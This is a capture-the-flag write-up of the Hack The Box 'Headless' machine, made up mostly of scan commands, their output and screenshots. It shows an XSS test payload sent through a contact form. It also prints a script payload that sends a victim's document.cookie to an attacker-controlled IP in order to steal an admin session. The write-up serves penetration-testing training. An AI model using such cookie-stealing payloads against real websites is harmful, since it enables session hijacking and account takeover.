# Hack the Box | Headless

```shell
rustscan -b 1000 -u 5000 -a 10.10.11.8 -r 0-65535
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.8:22
Open 10.10.11.8:5000
[~] Starting Script(s)
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-28 04:58 EDT
Initiating Ping Scan at 04:58
Scanning 10.10.11.8 [2 ports]
Completed Ping Scan at 04:58, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:58
Completed Parallel DNS resolution of 1 host. at 04:58, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:58
Scanning 10.10.11.8 [2 ports]
Discovered open port 22/tcp on 10.10.11.8
Discovered open port 5000/tcp on 10.10.11.8
Completed Connect Scan at 04:58, 0.11s elapsed (2 total ports)
Nmap scan report for 10.10.11.8
Host is up, received conn-refused (0.11s latency).
Scanned at 2024-07-28 04:58:24 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

![image](https://github.com/user-attachments/assets/3f8bfa63-74f2-45f5-bf57-0aa09aab8802)
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sun, 28 Jul 2024 13:12:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2799
Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
Connection: close
```
![image](https://github.com/user-attachments/assets/7f735d8a-1c76-438f-869c-7a5ef2bcf244)
![image](https://github.com/user-attachments/assets/cf9b28f5-7fae-4ee1-9987-c46479da10be)
![image](https://github.com/user-attachments/assets/480f95e3-2ac1-4db1-a882-33250ba8247f)
```
fname=Ricky&lname=1337&email=ricky%40hackme.com&phone=9879879870&message=<script>alert('XSS')</script>
```
![image](https://github.com/user-attachments/assets/b43b8b99-2efb-4feb-a712-da2b2e09dd35)

```shell
feroxbuster -u http://10.10.11.8:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --no-recursion --dont-extract-links --random-agent --filter-status 404 --redirects
```
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.8:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       93l      179w     2363c http://10.10.11.8:5000/support
200      GET       96l      259w     2799c http://10.10.11.8:5000/
500      GET        5l       37w      265c http://10.10.11.8:5000/dashboard
[####################] - 24s     4725/4725    0s      found:3       errors:0      
[####################] - 23s     4724/4724    202/s   http://10.10.11.8:5000/          
```
![image](https://github.com/user-attachments/assets/bd0d8ceb-9499-4274-9c79-631a16e67878)

![image](https://github.com/user-attachments/assets/1a624181-7897-4005-bb0f-13fac63fc3ec)

![image](https://github.com/user-attachments/assets/dc1d7bcf-ed72-4b3a-ba99-d321a19c5282)

![image](https://github.com/user-attachments/assets/6ee1f70c-b15b-463d-8770-1c184b2687f1)

```js
<script>var i=new Image(); i.src="http://10.10.14.47/?c="+document.cookie;</script>
```
![image](https://github.com/user-attachments/assets/1c522809-9751-4e4f-b49b-c7f9034f057d)

![image](https://github.com/user-attachments/assets/a4648355-36a0-49ec-b160-1b5beb5e8ecf)

Response in browser:
![image](https://github.com/user-attachments/assets/c542ecdc-e135-43eb-99f5-6dd7d2656af8)
